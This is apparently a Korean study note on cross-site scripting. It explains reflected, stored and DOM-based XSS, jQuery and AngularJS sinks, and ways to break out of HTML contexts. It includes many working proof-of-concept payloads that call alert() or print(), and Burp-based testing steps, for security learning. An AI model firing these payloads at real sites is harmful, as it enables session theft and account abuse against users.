## XXS

서버가 사용자의 입력을 의심 없이 화면에 그대로 내보내는 경우, 텍스트 대신 악성 스크립트를 주입하여 피해자의 브라우저에서 스크립트를 읽었을때 강제로 실행되게 만드는 취약점

대부분의 XSS 취약점을 확인할때 무해한 `alert()`를 활용해서 테스트함. 
참고: 크롬 브라우저에서 2021년 7월 20일부터 버전 92부터, 교차 출처 iframe이 `alert()` 를 호출하는 것을 막혔음. 일부 고급 XSS 공격에서는 `print()`를 사용하는 것을 권장함. 

**종류**
- 반사형 XSS: 악성 스크립트가 담긴 URL을 유포하는 방식
- 저장형 XSS: 악성 스크립트가 타겟 웹사이트의 DB에 저장되는 방식
- DOM 기반 XSS: 오직 사용자의 브라우저(클라이언트 측) 내부에서만 발생하는 방식

### 반사형 XSS

애플리케이션이 HTTP 요청(쿼리 파라미터, HTTP 바디)으로 수신한 데이터를 안전한 처리(인코딩) 없이 즉각적인 응답(HTML 소스 코드)에 그대로 포함할 때 발생하는 취약점. 

#### 영향

- 사용자가 애플리케이션 내에서 수행할 수 있는 모든 작업을 수행 가능
- 사용자가 볼 수 있는 모든 정보 표시 
- 사용자가 수정할 수 있는 모든 정보 변경
- 다른 애플리케이션과의 상호 작용을 통해 또다른 악성 공격을 할 수 있음. 

#### 예시

웹사이트의 검색 기능에서 사용자가 입력한 검색어를 URL 파라미터로 전달하고 
``` url
https://insecure-website.com/search?term=gift
```

그 결과가 HTML 소스 코드에 반영되는 경우 
``` html
<p>You searched for: gift</p>
```

해커의 공격 과정
1. 해커가 악성 스크립트를 작성: 사용자의 쿠키를 가져오거나 등 
``` html
https://insecure-website.com/search?term=<script>악성 스크립트</script>
```

2. 피해자가 저 URL을 들어올 수 있도록 유도: 피싱 메일 등
3. 피해자가 URL에 들어오면 HTML 소스 코드에 해당 악성 스크립트가 포함되어 있고 브라우저가 `<script>` 스크립트를 읽으면 실행시킴. 
``` html
<p>You searched for: <script>악성 스크립트</script></p>
```


#### 테스트 방법

1. 엔드포인트 테스트: 웹 애플리케이션에서 데이터가 들어가는 HTTP 요청을 찾아봄
	- URL 쿼리 파라미터, HTTP 바디, URL 파일 경로 등 
2. 입력한 값이 화면에 반사되어 나오는지 확인: 입력 유효성 검사에 걸리지 않도록 특수문자를 빼고 알파벳과 숫자로만 구성
	- Burp Intruder의 `Grep - Payloads` 기능을 켜두면 내가 쏜 무작위 값이 응답에 반사되어 돌아왔을 때 Burp가 자동으로 체크해줌. 
3. 반사된 위치 파악: 위치에 따라 공격 코드가 달라지므로 응답 HTML의 어떤 위치에 떨어졌는지 파악해야함. 
	- 일반적인 HTML 태그 사이 텍스트: `<div>여기에 반사됨</div>`
	- HTML 태그의 속성값 내부: `<input value="여기에 반사됨">`
	- 자바스크립트 문자열 내부: `let name = '여기에 반사됨';`
4. 테스트 스크립트 주입: `alert()` 같이 기본적인 자바스크립트를 담아서 Repeater로 요청을 보낸 뒤, 응답 화면을 보면서 내 코드가 안 깨지고 잘 들어갔는지 확인
	- 악성 스크립트 앞에 무작위 문자열을 붙여서 보내면 응답 창에서 그 무작위 문자열을 검색해서 빠르게 찾을 수 있음. 
		- 예: `a1b2c3d4<script>alert(1)</script>`
5. 실제 공격
	- Burp Proxy의 인터셉트에서 요청을 가로채서 페이로드를 끼워 넣거나, 브라우저 주소창에 완성된 악성 URL을 직접 복사해 붙여넣음. 


### 저장형 XSS

공격자가 삽입한 악성 스크립트가 서버(DB, 파일 등)에 저장된 후, 해당 데이터를 조회하는 불특정 다수 피해자의 웹 브라우저에서 스크립트가 실행되도록 하는 XSS 공격
예: 블로그 게시물에 대한 댓글, 채탕방의 사용자 닉네임, 고객 주문 연락 정보 등

저장형 XSS는 애플리케이션 내에서 자체적으로 작동하는 공격을 하기 때문에 반사형 XSS와 다르게 피해자가 특정 요청을 보내도록 유도하는 **외부 방법(예: 피싱 메일)을 사용할 필요가 없음.** 

또한 반사형 XSS는 피해자가 로그아웃인 경우 세션 쿠키 같은 것을 탈취하는 것이 불가능하므로 피해자의 로그인 여부에 따라 공격의 성공 여부가 정해지지만, 저장형 XSS는 **로그인 후 이용하는 내부 페이지에 스크립트가 저장되는 경우가 많아서 공격 성공률이 높음.** 

#### 예시

웹사이트에서 게시물에 대한 댓글을 다는 요청 예시
``` http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

응답 HTML 예시
``` html
<p>This post was extremely helpful.</p>
```

해커의 공격
``` http
comment=<script>악성 스크립트</script>
```
- **URL 인코딩 해야함.**

``` html
<p><script>악성 스크립트</script></p>
```


#### 테스트 방법

저장된 XSS 취약점에 대한 수동 테스트는 입력 지점과 출력 지점을 모두 찾아야하므로 어려움. 
- **입력 지점**: 애플리케이션 처리 과정에서 데이터가 들어가는 지점
- **출력 지점**: 그 데이터가 애플리케이션 응답에서 나타나는 지점
특히 출력 지점은 찾아내기 어려움. 
- 해커가 볼 수 없는 관리자 페이지나 숨겨진 로그에만 나올 수 있음. 
- 최근 검색어처럼 데이터가 영구 보존되지 않고 밀려서 사라질 수 있음. 

1. 입력 지점 찾기
	- URL 쿼리 파라미터 및 POST 바디 데이터 (게시글, 댓글, 프로필 등)
	- HTTP 요청 헤더: `User-Agent`, `Referer` 등 (방문자 로그, 통계 페이지에 저장됨.)
	- 외부 데이터 연동: 웹메일 수신 메일 본문, 외부 API(트위터/SNS 피드, 뉴스 등)를 통해 유입되는 데이터
2. 출력 지점 찾기: 모든 입력창과 모든 페이지를 하나씩 짝지어서 확인하는 것보다 고유한 식별값을 뿌려두고 추적하는 것이 효율적임.
	- 이름 입력창: `test_name_01`
	- 이메일 입력창: `test_email_01`
	- User-Agent 헤더: `test_ua_01`
	- 이후 Burp 검색 기능으로 `test_` 같은 표식이 어떤 응답페이지에서 튀어나오는지 추적 
3. 단순 반사 vs 실제 저장 구별: 응답 내에서 표식이 발견되었을때, 방금 보낸 요청으로 즉각 답이 나온 것(반사형 XSS)인지 아니면 DB에 저장된 후 불러온 것(저장형 XSS)인지 확인해야함.


### DOM 기반 XSS

애플리케이션이 자바스크립트가 공격자가 제어할 수 있는 소스(예: URL)에서 데이터를 가져와 `innerHTML`, `document.write()`, `eval()`, `setTimeout()`처럼 브라우저에서 동적으로 코드를 실행할 때 발생하는 XSS 취약점

#### HTML 싱크

브라우저가 화면을 그리는 과정에서 악성 스크립트가 실행되는 경우
브라우저에서 사용되는 함수: `innerHTML`, `document.write()`, `outerHTML` 등

https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities

##### 예시

**주소창 기반으로 HTML에 반영되는 경우**
DOM 기반 XSS 공격의 가장 흔한 경우가 URL을 `window.location`로 접근하는 상황임.

- 서버 코드: URL에서 악성 스크립트가 있다면 실행됨. 
``` html
<!-- 서버가 만들어서 보내준 HTML 소스코드 (아주 깨끗함) -->
<html>
  <body>
    결과: <span id="results"></span> 

    <script>
      // 브라우저가 주소창(URL)을 읽고 화면에 그리는 코드 
      let q = new URLSearchParams(window.location.search).get('query');
      document.getElementById('results').innerHTML = q; 
    </script>
  </body>
</html>
```

- 해커의 공격: 피싱 메일 등을 통해서 피해자가 이 경로로 들어오도록 해야함. 
``` html
http://ex.com/search.html?query=<img src=x onerror=alert('해킹성공')>
```

1. `window.location.search`: 쿼리 파라미터 `?query=<img src=x onerror=alert('해킹성공')>`를 가져옴 
2. `ineerHTML`로 화면 렌더링: 브라우저가 `<img src=x onerror=alert('해킹성공')>`를 화면에 그리려고 시도하고 `alert()`가 실행됨. 

**참고**
현재 최신 브라우저들은 보안(HTML5 표준)을 위해 `innerHTML`을 통해 삽입된 `<script>` 태그, `<svg>`태그의 `onload` 이벤트는 실행하지 않고 무시함. 
따라서 `<img>`나 `iframe`의 `onerror`를 사용해야함. 


**404 오류 페이지 예시** 
없는 경로로 페이지를 요청시 "죄송합니다. {해당 경로}를 찾을 수 없습니다."라고 보여주는 웹사이트의 경우에 
`http://example.com/<script>alert(1)</script>`를 넣으면 (`innerHTML`이 아니라고 가정) "죄송합니다 `<script>alert(1)</script>`를 찾을 수 없습니다."가 브라우저에 그려지면서 XSS 공격이 성공함. 

**PHP 기반 웹사이트 예시** 
PHP에서는 `http://example.com/index.php/user/profile` 처럼 파일 이름(`index.php`) 뒤에 슬래시(`/`)를 붙여서 경로를 길게 쓰는 경우가 많았음. 
이때도 프론트엔드 자바스크립트가 저 뒷부분의 경로를 읽어서 화면을 구성한다면, 해커가 그 자리에 악성 코드를 넣어서 공격 가능


###### 속성 벗어나기

검색을 하면 화면에 검색어와 검색결과가 나오는 웹사이트의 경우

TEST1234 검색 -> img 태그 내에 있는거 확인 후 -> img 검색해서 만들어지는 코드 확인
``` js
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
...
```

공격 스크립트: src 속성에서 벗어나야 하기 때문에 앞에 `"`를 붙여줘야함. 
- `"><script>alert(1)</script>`
- `"'><img src onerror=alert(1)>`
- `"><svg onload=alert(1)>`

###### 태그 벗어나기 

``` js
<script>
	var stores = ["London","Paris","Milan"];
	var store = (new URLSearchParams(window.location.search)).get('storeId');
	    document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
...
```

공격 스크립트: `</select><img src=1 onerror=alert(1)>`
``` js
<select name="storeId">
<option selected>
// select 태그를 닫아준 뒤 img 사용해야 정상적으로 파싱됨. 
</select><img src=1 onerror=alert(1)>
// 무시됨
</option> 
```
- `select` 태그를 닫아준 뒤 `img` 태그를 사용해야함. 

##### 테스트

1. 테스트용 문자열 입력: 웹 브라우저의 주소창(URL)이나 입력칸에 고유한 문자열을 입력
2. 문자열 검색
	- 페이지 소스 보기: 원본 HTML만 보여주므로 사용 X
	- **개발자 도구**: 자바스크립트가 실행된 후 현재 화면 상태(DOM)를 실시간으로 보여줌. 검색 기능(Cmd + F)을 이용해서 고유한 문자열을 찾아야함. 
	- 문자열을 찾은 후 해당 태그가 만들어지는 JS 코드를 찾아야함. 만약 서버에서 만들어지는 경우라면 JS 코드가 없고 XSS가 불가능한 것임.
3. 문맥 파악 및 탈출 시도: 문자열이 나타나는 위치를 파악하고 컨텍스트에 맞게 공격 코드를 다르게 작성해야함. 
	- 일반적인 HTML 태그 사이 텍스트: `<div>TEST1234</div>`
	- HTML 태그의 속성값 내부: `<input value="TEST1234">`
	- 자바스크립트 문자열 내부: `let name = 'TEST1234';`
	- 예를 들어 태그의 속성값 내부에서 나타난다면 `"`를 이용해서 탈출 시도를 해봐야함. 


**주의**
최신 브라우저들은 주소창(URL)을 URL 인코딩하는데 이럴 경우 해커가 입력한 특수문자(`<`, `>`, `"`)가 `%3C`, `%3E`, `%22` 같은 안전한 형태(URL 인코딩)로 변환되기 때문에 XSS 공격이 실패할 수 있음. 

최신 브라우저에서 자동 URL 인코딩이 적용되어도 DOM 기반 XSS 공격이 성공하는 경우
- 최신 자바스크립트 API의 자동 디코딩: 요즘 개발자들은 주소창의 파라미터를 읽을 때 `URLSearchParams`라는 최신 자바스크립트 내장 객체를 주로 사용하는데 자동 디코딩을 해버림. 
- 개발자의 디코딩 함수 사용: 사용자가 검색한 단어를 화면에 URL 인코딩해서 보여주면 UX가 떨어지기 때문에 `decodeURIComponent()`나 `decodeURI()` 같은 함수를 직접 사용해둘 수도 있음. 
- URL 인코딩을 거치지 않는 다른 유입 경로: 주소창(`location.search`, `location.hash`)이 아니라 다른 공격 통로 이용
	- `document.referrer`: 사용자가 방금 전 머물렀던 이전 페이지의 URL
	- `window.name`: 브라우저 탭이나 창의 고유 이름
	- `postMessage`, `event.data`: 다른 창이나 프레임 간에 주고받는 메시지
	- `localStorage`, `sessionStorage`: 브라우저 내장 데이터 저장소


#### 자바스크립트 실행 싱크

브라우저가 자바스크립트 명령어 자체를 실행하는 경우 
브라우저에서 사용되는 함수: `eval()`, `setTimeout()`, `setInterval()` 등

##### 예시

**주소창에 따라 다른 기능 실행**
가장 많이 발생하는 케이스입니다. 개발자가 코드를 줄이고 싶어서 머리를 쓴 경우

``` js
// ?action=closePopup 이면 팝업을 닫고, ?action=refresh 면 새로고침을 하려는 의도
let action = new URLSearchParams(window.location.search).get('action');

// 개발자의 의도: setTimeout("closePopup()", 1000) 
setTimeout(action + "()", 1000); 
```
- **문제점**: `setTimeout`은 첫 번째 인자로 '문자열'이 들어오면 그걸 `eval()`처럼 자바스크립트로 실행해 버림.
- 해커의 공격: `?action=alert(1)//` 라고 입력
- 결과: `setTimeout("alert(1)//()", 1000);`, 뒤에 붙은 `//`는 원래 있던 `()`를 주석 처리해버리고 `alert(1)`이 실행됨.


**로그인 후 리다이렉트**
로그인을 하거나 특정 작업이 끝난 뒤, 사용자가 원래 있던 페이지로 돌려보내 주기 위해 주소창에 `returnUrl`을 달고 다니는 경우

``` js
// ?returnUrl=/home/dashboard
let returnUrl = new URLSearchParams(window.location.search).get('returnUrl');

// "돌아가기" 버튼을 누르면 해당 URL로 이동시킴
document.getElementById('back-btn').onclick = function() {
    window.location.href = returnUrl; 
}
```
- **문제점:** 브라우저 주소창(`window.location.href`)에 `javascript:...` 로 시작하는 문자열을 넣으면, 브라우저는 그걸 URL로 이동하는 게 아니라 자바스크립트 코드로 실행해 버림. (이것도 일종의 자바스크립트 실행 싱크임.)
- 해커의 공격: `?returnUrl=javascript:alert('1')`
- 결과: 피해자가 "돌아가기" 버튼을 누르는 순간 `eval()`이란 단어는 코드에 단 한 줄도 없었지만 `alert(1)`이 실행됨.


**개발자의 실수**
현실의 웹사이트 코드는 몇 줄이 아니라 수만 줄임. 변수가 꼬리에 꼬리를 물고 이어지기 때문에 개발자 본인도 이 데이터가 어디서 출발했는지 잊어버리는 경우

``` js
// 파일 A.js (입구)
let userData = location.search.get('data');
processData(userData);

// ... (수백 줄 뒤, 혹은 다른 파일 B.js) ...

function processData(data) {
    let formatted = formatString(data);
    renderUI(formatted);
}

// ... (다른 파일 C.js - 출구) ...

function renderUI(uiData) {
    // 개발자는 uiData가 안전한 서버 데이터라고 착각함
    setTimeout(uiData.callback, 0); 
}
```
- **결과:** 소스코드를 짠 사람도 다르고, 파일도 다릅니다. 데이터를 넘겨받은 마지막 개발자는 `uiData`가 주소창에서부터 굴러온 위험한 데이터라는 것을 모르고 `setTimeout()`에 넣어버림.


##### 테스트

입력값이 `eval()`이나 `setTimeout()` 같은 자바스크립트 실행 함수(Sink)로 들어가 실행되기 때문에 HTML 화면에 아예 나타나지 않음. 글자가 화면에 찍히는 게 아니라 백그라운드에서 코드로 바로 실행되어 버리기 때문임. 

1. 자바스크립트 코드에서 입력값 유입로 찾기 
	- 개발자 도구에서 전체 검색 단축키(Cmd + Opt + F) 이용
	- `location.search`, `location.hash` 등 사용자의 입력값을 읽어들이는 키워드를 검색해서 어느 줄에서 이 코드를 사용하는지 찾기
2. 중단점을 통한 변수 추적: 입력값이 어디로 흘러가는지 확인해야함.  
	- 개발자 도구의 소스 탭에서 해당 코드 줄 번호를 클릭해 **중단점 설정** 
	- 그 후 새로고침하면 해당 줄에서 멈춘 것처럼 실행이 일시 정지됨. 
	- 정지된 상태에서 코드를 한 줄 씩 실행시키며 입력값이 어떤 변수를 거쳐 이동하는지 추적
3. 싱크 직전 상태 확인: 추적 끝에 `eval()`, `setTimeout()`같이 자바스크립트 실행 함수를 만났다면 공격이 가능함. 
	- 해당 함수 직전에 멈춰놓고 변수 위에 마우스를 올리면 입력값이 어떻게 다듬어져 있는지 확인할 수 있음. 
	- 해당 형태를 기반으로 공격 스크립트를 작성하여 공격
	- 예: 입력값이 `'TEST1234'`처럼 작은따옴표 안에 갇혀있다면, 주소창의 입력값을 조작해 `TEST'; alert(1); //` 처럼 바꿔서 넣음.

#### DOM Invader

개발자 도구로 일일이 검색하며 추적해야하는 것을 자동화 해주는 Burp Suite 내장 브라우저 기본 확장 프로그램 

- 카나리아(Canary) 자동 추적: 고유한 난수 문자열을 URL 파라미터나 폼 입력칸에 자동으로 넣어주고 이 문자열이 어떤 싱크(Sink)에서 나오는지 감시
- 문맥 자동 분석: 입력값이 HTML 태그 안인지, 자바스크립트 문자열 내부인지 자동으로 분석해 목록으로 보여줍니다.
- 페이로드 자동 생성: 발견된 취약점의 문맥에 딱 맞는 XSS 공격 코드를 자동으로 추천하고 테스트해 줌. 
- 웹 메시지 가로채기: 수동으로는 찾기 힘든 창 간 통신 취약점(`postMessage`)을 찾아서 조작할 수 있도록 함. 


#### jQuery 취약점

##### `attr()`

jQuery의 `attr()` 함수는 HTML 요소의 속성값을 가져오거나 추가 및 변경할 수 있음. 

``` js
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
- `#backLink`가 `<a id="backLink" href="a">Back</a>` 이런 태그라고 할때, 백링크를 클릭했을때 악성 자바스크립트가 실행되도록 하려면 `javascript:alert(document.domain)` 이걸 넣어주면 됨. 
- `javascript:`는 브라우저가 주소를 해석할 때 사용하는 가상 프로토콜임. 주소를 해석하다가 `href`나 `src` 속성에서 `javascript:`를 만나면 해당 문자열을 자바스크립트로 실행한 후 주소를 이동함. 


##### `$()`

`$()`에 `#section1` 같은 **CSS 선택자**가 들어가면 해당 요소를 화면에서 검색함. (일반적인 사용) 하지만 `$()`에 `<img src=x onerror=alert(1)>` 같은 **HTML 태그 형태의 문자열**이 들어가는 경우, jQuery는 새로운 HTML 요소를 즉시 생성(렌더링)해 버림. 이걸 이용해서 DOM 기반 XSS 공격이 가능함. 

최신 버전의 jQuery는 `$()`에서 첫 글자가 `#`이면 그 이후 HTML 요소들을 문자열로만 취급하도록 패치됨.

``` js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

`https://타겟.com/#<img...>` 그냥 이런식의 url을 피해자에게 보내면 초기 로드이므로 `hashchange` 이벤트가 트리거가 되지 않음. 
그래서 해커의 사이트에 `iframe`으로 타겟 사이트를 넣고 피해자가 그 사이트에 들어오도록 함. 
피해자가 들어오면 iframe 태그를 브라우저가 그리게 되고 이때 `onload`로 `hashchange` 이벤트를 트리거 시킴.  
``` html
<iframe src="https://타겟.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```


#### AngularJS 취약점

HTML 요소에 `ng-app` 속성을 사용하면, AngularJS 프레임워크를 통해서 처리됨. AngularJS에서 `{{ }}` 안에 들어있는 값은 자바스크립트 코드로 실행함. 

`alert()`, `document.cookie`, `location` 같은 브라우저 내장 함수들은 전역(Global/Window) 영엑에 존재하기 때문에 사용하기 위해서는 `$on.constructor`를 이용해야함. 
- 예: `{{$on.constructor('alert(1)')()}}`


#### 반사형, 저장형 DOM XSS

해커의 악성 스크립트가 주소창에서 자바스크립트로 직접 들어가는 것이 아니라 **서버를 한번 거쳐서 응답 HTML 내부에 심어진(반사된/저장된) 다음** 그 값을 자바스크립트가 실행시켜서(`innerHTML`, `eval` 등) 발생하는 DOM XSS 취약점

**예시**
내가 보낸 검색어에 대한 결과가 JSON으로 반환되고 그걸 `eval()`하는 상황
``` json
// 응답 
{
	"results":[],
	"searchTerm":"zzz"
}
```

해커의 공격: 현재 서버에서 `"`를 `\"`로 처리하는 방어코드를 실행 중이므로 `\`를 넣어서 무효화시킴
- `/?search=\"};alert();//`: `;`로 표현식 분리
- `/?search=\"-alert()}//`: `-`로 표현식 분리

``` json
// 결과 
{
	"results":[],
	"searchTerm":"\\"
};alert();"}
```
- 입력한 공격스크립트가 응답에서 어떻게 처리되는지 확인해야함. 


##### 참고: 자바스크립트 내장 함수의 함정

자주 나오는 대표적인 자바스크립트 내장 함수들의 문법적 허점

- `replace()`의 1회성 동작: 정규표현식(`/.../g`)이 아닌 단순 문자열을 인자로 넣으면 맨 처음 발견된 하나만 치환함.
- 느슨한 타입 비교 (`==`): 자바스크립트는 `0 == ""` 나 `false == "0"` 같은 기상천외한 비교를 참(True)으로 판정함. 
- 문자열 검색의 한계 (`indexOf`, `includes`): 특정 안전한 주소(`https://example.com`)가 포함되어 있는지 검사하는 로직이 있을 때, 해커는 `javascript:alert(1);https://example.com` 처럼 실행 코드 뒤 주석 영역에 해당 문자열을 배치하여 필터를 속여 넘김.


### XSS 컨텍스트 

#### HTML 태그 내

##### body 태그 중복으로 속성 주입

`<body>`, `<html>` 태그는 내부에 아무리 여러 번 주입해도 새로운 요소가 생기지 않고, 그 속성(예: `onresize`, `onload` 등)들만 맨 껍데기 메인 `<body>`, `<html>`에 적용됨. 

예시: `<body>` 태그에 이벤트 속성을 추가하고 `iframe`의 `onload`로 바로 발생시키는 스크립트
``` html
<iframe src="https://example.com/?search=<body onresize=print()>" onload=this.style.width='100px'>
```


##### 커스텀 태그 공격

이미 존재하는 태그들이 막힌 경우에 커스텀 태그를 만들어서 XSS 공격을 수행할 수 있음. 

1. 강제 포커스: `onfocus` + `autofocus`: 원래 `onfocus`는 사용자가 클릭을 해야 발생하지만 `autofocus` 속성을 추가하면 페이지가 열리자마자 브라우저가 알아서 그 태그를 포커스하게 됨. 
	- 페이로드: `<custom-tag tabindex="1" autofocus onfocus="alert(1)">`
	- 입력 폼 태그가 아닌 다른 태그들은 포커스를 받지 못하지만 `tabindex`를 추가함으로써 포커스를 받을 수 있도록 함. 

2. URL 해시(`#`)를 이용한 포커스 이동: 태그에 id를 부여하고 URL에 id를 붙여 해당 id로 접속(포커스) 되도록 함. 
	- 페이로드: `<custom-tag id="x" tabindex="1" onfocus="alert(1)">`
	- 접속 URL: `https://취약한사이트.com/?search=<custom-tag id="x" tabindex="1" onfocus="alert(1)">#x`
	-  브라우저가 URL 끝에 있는 `#x`를 보고, 페이지가 열리자마자 `id="x"`인 커스텀 태그 위치로 스크롤되어 포커스를 줌. 

3. CSS 애니메잉션 이벤트: 애니메이션이 실행되면 발생하는 `onanimationstart` 이벤트 이용
	- 페이로드: `<custom-tag style="animation: x 1s" onanimationstart="alert(1)">`


##### svg 태그 활용

**animate 태그로 속성 동적 주입**

`animate` 태그는 `svg` 태그 내부에서만 사용 가능한데, `attributeName`과 `values`로 동적으로 속성을 주입할 수 있음. 

```html
<!-- 1. xlink:href가 없으면 자동으로 자신을 감싸고 있는 부모 태그를 지정 -->
<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x="20" y="20">Click me</text></a></svg>


<!-- 2. href 속성으로 id가 target-link인 요소를 지정 -->
<svg><animate href="#target-link" attributeName="href" values="javascript:alert(1)" /><a id="target-link"><text x="20" y="20">Click me</text></a></svg>
```
- `alert()`를 실행시키기 위해 `a` 태그의 `href` 속성을 동적 주입


**onbegin 속성으로 자바스크립트 실행**

`onbegin`은 `svg` 내부에서 애니메이션 태그들이 작동(재생)되기 시작할때 자바스크립트를 실행시키는 속성임. 

애니메이션 태그
- **`<animate>`**: 요소의 단일 속성(크기, 색상, 투명도 등)을 변화시킬 때 사용
- **`<set>`**: 애니메이션 효과 없이, 특정 시간이 지난 후 속성값을 한 번에 바꿀 때 사용 
	- 예: 3초 뒤에 갑자기 보이기
- **`<animateTransform>`**: 요소를 회전(`rotate`), 확대/축소(`scale`), 이동(`translate`) 시킬 때 사용
- **`<animateMotion>`**: 요소를 가상의 경로를 따라 부드럽게 이동시킬 때 사용

``` html
<!-- <set> 태그를 이용한 XSS 우회 공격 예시 -->
<svg><set attributeName="font-size" onbegin="alert('XSS 뚫림')"></set></svg>

<!-- <animateTransform> 태그를 이용한 XSS 우회 공격 예시 -->
<svg><animateTransform onbegin="alert('XSS 뚫림')"></animateTransform></svg>
```


#### HTML 태그 속성 내

1. `">`를 앞에 붙여서 태그 벗어나기
``` html
"><script>alert(document.domain)</script>
```

2. `<`, `>`가 차단되거나 인코딩되어 태그 안에서 벗어나지 못하는 경우에는 새로운 속성을 도입해서 자바스크립트가 실행되도록 함. (`onfocus`, `onmouseover` 등)
``` html
" autofocus onfocus=alert(document.domain) x="
```
- `"` : 기존의 `value` 속성을 여기서 끝내버립니다.
- `autofocus onfocus=...` : 꺾쇠괄호 없이 이벤트 속성을 추가해 스크립트를 자동 실행시킴.
- `x="` : 원래 서버 쪽에 남아있던 마지막 큰따옴표(`"`)와 짝을 맞춰 문법 오류를 방지

**주의: 개발자 도구의 함정**
- 크롬 개발자 도구(F12)의 '요소(Elements)' 탭: 서버가 작은따옴표(`'`)로 보냈더라도 브라우저가 화면에 그릴 때 큰따옴표(`"`)로 고쳐서(정규화) 보여주는 특징 있음.
- 페이지 소스 보기(View Page Source): 서버에서 넘어온 코드를 그대로 볼 수 있음. 


**href 속성에서 `javascript:`로 스크립트 실행**

``` html
<a href='javascript:alert()'>...</a>
```

참고: `javascript:`는 자동으로 URL 디코딩 한 후 명령어를 실행함. 


**캐노니컬 태그에서 단축키 설정으로 자바스크립트 실행**

이벤트 속성을 사용하지 못하는 태그(예: 캐노니컬 태그 `link`)에서 `accesskey` 속성으로 단축키 이벤트를 지정할 수 있음. 

페이로드: `aaa' accesskey='x' onclick='alert()`
``` html
<link rel="canonical" href='https://example.com?aaa' accesskey='x' onclick='alert()'/>
```


#### JavaScript 공격

##### 브라우저의 동작

브라우저가 HTML 응답을 받고 화면을 띄우기까지 일어나는 동작

1. HTML 파싱 및 DOM 트리 생성: HTML 파서가 문서를 읽어 내려가며 브라우저가 이해할 수 있는 구조(DOM 트리)로 조립함. 
	- **HTML 속성들이라면 HTML 디코딩이 수행됨.** 
	- `<script>` 태그를 발견하면 안쪽 내용은 읽지 않고 `</script>`만 찾아서 덩어리로 자바스크립트 엔진에 넘김. (**안쪽의 내용은 읽지 않으므로 HTML 디코딩이 안됨.**)

2. 외부 리소스 요청 및 CSS 파싱: `<link>`(CSS), `<img>`, `<script src="..."`(외부 JS) 등을 만나면 파싱을 멈추거나 백그라운드에서 해당 파일을들 추가로 요청하여 다운로드함. 

3. 자바스크립트 엔진 실행: HTML 파서로부터 넘겨받은 `<script>` 코드 덩어리를 해석
	- 문법 검사: 코드를 읽으면서 괄호 짝이 맞는지, 오타가 없는지 등의 문법 검사를 함. 문법이 틀린 경우에는 코드 전체를 실행하지 않고 폐기함. 

참고: URL 해석 및 디코딩
**URL 디코딩은 HTML을 읽을 때가 아니라 브라우저가 해당 URL을 실제로 사용하려고 할때 발생함.** 
예: 사용자가 `<a href="...">` 링크를 클릭할 때, 브라우저가 `<img src="...">`의 이미지를 다운로드하려고 할때
`a`의 `href`에서 `javascript:`가 실행될때 자동으로 URL 디코딩 되는 이유가 이것때문임. 



**브라우저 분석 도구 별 특징**

| 분석 도구              | 보여주는 내용                                 | HTML 파서 적용 상태        | 웹 해킹 활용 목적                                                  |
| ------------------ | --------------------------------------- | -------------------- | ----------------------------------------------------------- |
| 1. 페이지 소스 보기       | 서버가 브라우저로 전송한 최초의 HTML 텍스트 원본           | **적용 전**             | 서버의 방어 로직이 내 입력값을 어떻게 변환(인코딩)하여 보냈는지 최초 상태 확인               |
| 2. 개발자 도구 (요소)     | 브라우저가 해석을 마치고 화면에 렌더링 중인 실시간 DOM 트리     | **적용 후**             | HTML 디코딩(`&#x27;` ➔ `'`)이 완료되었거나, 자바스크립트가 화면을 조작한 최종 결과물 확인 |
| 3. 개발자 도구 (소스)     | 브라우저가 다운로드한 개별 파일(HTML, JS, CSS) 원본 리스트 | **적용 전**             | 주로 프론트엔드 자바스크립트 코드의 흐름을 추적하고 중단점을 걸어 분석할 때 사용               |
| 4. Burp Suite (응답) | 네트워크 계층에서 오가는 순수한 HTTP 응답 패킷            | **적용 전 (브라우저 도달 전)** | 브라우저가 아예 개입하기 전, 서버가 내뱉은 가장 날것의 데이터 확인                      |

따라서 웹 해킹 실습 중 **서버가 내 입력값을 어떻게 필터링했는지 원인을 분석**하려면 **페이지 소스 보기**나 **Burp Suite**를 확인해야 함. 
반면, 내가 주입한 우회 페이로드가 브라우저 파서를 거쳐 공격이 성공했는지 **최종 결과**를 보려면 **개발자 도구의 요소** 탭을 확인해야 합니다.



##### 기존 스크립트 중단

``` html
<script>
...
var input = '공격 스크립트가 들어가는 자리';
...
</script>
```

공격 스크립트: `</script><img src=1 onerror=alert(document.domain)>`

HTML 파서는 `<script>`를 발견하면 내부의 코드를 읽지 않고 `</script>`만을 찾아내서 자바스크립트 엔진으로 보냄. ([[#브라우저의 동작]])
- 자바스크립트 엔진은 해당 코드에서 `'`가 남아있는 것을 보고 폐기 처리함. 
- HTML에 남은 `';`와 `</script>` 등은 무시되거나 단순 텍스트로 처리됨. 


##### 자바스크립트 문자열에서 벗어나기

``` html
<script>
	var searchTerms = 'TEST1234';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');          
</script>
```

공격 스크립트
- `'-alert(document.domain)-'`: 마이너스 연산자를 이용해서 `(빈 문자열) - (alert 함수 실행 결과) - (빈 문자열)`이라는 하나의 표현식으로 만듬. 뺄셈을 계산하려면 중간에 있는 `alert()`를 먼저 실행하도록 함. 
- `';alert(document.domain)//`: `;`를 이용해서 앞선 명령을 종료하는 방식임. 뒤에 `'`가 남기 때문에 `//`로 주석처리를 해줘야함. 

결과: `alert()` 실행
``` html
<script>
	var searchTerms = '';alert()//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');          
</script>
```


이 경우를 대비해서 웹 애플리케이션은 자바스크립트 문자열 내에서 벗어나지 못하도록 `'` 입력을 `\'`로 이스케이프 시키도록 대비를 해둠. (**자바스크립트에서 `\`는 바로 뒤에 오는 문자의 원래 기능을 없애고 텍스트로 취급하는 지시어**)

그러나 종종 `\` 자체를 이스케이프 해두는 것을 빼먹는 실수를 하기도 하는데 그런 경우에 이런식으로 공격이 가능함. 
- 공격: `\';alert(document.domain)//` 
